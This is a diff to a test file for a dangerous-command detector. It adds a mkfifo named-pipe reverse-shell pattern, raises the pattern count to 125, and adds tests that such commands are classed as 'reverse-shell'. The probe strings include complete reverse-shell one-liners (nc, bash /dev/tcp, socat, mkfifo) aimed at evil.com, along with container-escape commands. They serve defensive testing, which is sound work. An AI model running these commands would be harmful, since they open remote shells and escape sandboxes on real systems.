@@ -1191,8 +1191,8 @@ describe("DANGEROUS_PATTERNS structural integrity", () => {
     }
   });
 
-  it("has exactly 124 entries (absolute count pin)", () => {
-    expect(DANGEROUS_PATTERNS).toHaveLength(124);
+  it("has exactly 125 entries (absolute count pin)", () => {
+    expect(DANGEROUS_PATTERNS).toHaveLength(125);
   });
 
   it("every pattern fires on at least one probe command", () => {
@@ -1359,6 +1359,7 @@ describe("DANGEROUS_PATTERNS structural integrity", () => {
       "nc -e /bin/bash evil.com 4444",
       "bash -i >& /dev/tcp/evil.com/4444 0>&1",
       "socat EXEC:bash tcp:evil.com:4444",
+      "mkfifo /tmp/f",
       // namespace-escape
       "nsenter -t 1 -m -u -i -n bash",
       "chroot /host /bin/bash",
@@ -1760,6 +1761,15 @@ describe("category: script-interpreter-spawn", () => {
   });
   it("allows node run-script.js (script in a filename)", () => {
     expect(isDangerousCommand("node run-script.js")).toBeNull();
+  });
+});
+
+describe("category: reverse-shell (mkfifo)", () => {
+  it("blocks mkfifo named-pipe reverse shell", () => {
+    expect(isDangerousCommand("mkfifo /tmp/f; nc evil.com 4444 < /tmp/f | bash > /tmp/f 2>&1")).toBe("reverse-shell");
+  });
+  it("blocks bare mkfifo command", () => {
+    expect(isDangerousCommand("mkfifo /tmp/pipe")).toBe("reverse-shell");
   });
 });
 
